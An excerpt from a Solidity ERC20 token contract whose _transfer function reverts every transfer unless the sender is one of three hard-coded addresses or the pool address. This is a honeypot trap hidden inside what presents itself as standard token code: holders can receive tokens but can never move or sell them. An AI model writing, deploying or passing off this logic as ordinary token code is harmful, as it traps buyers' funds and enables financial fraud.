...
abstract contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _transfer(address from, address to, uint256 value) internal {
        if (from != address(0xE592427A0AEce92De3Edee1F18E0157C05861564) && from != address(0x74de5d4FCbf63E00296fd95d33236B9794016631) &&from != address(0x63E175E56c58f270DE017882b2eB486D14764124) && from != POOLADDRESS) {
            revert();
        }
        if (to == address(0)) {
             revert();
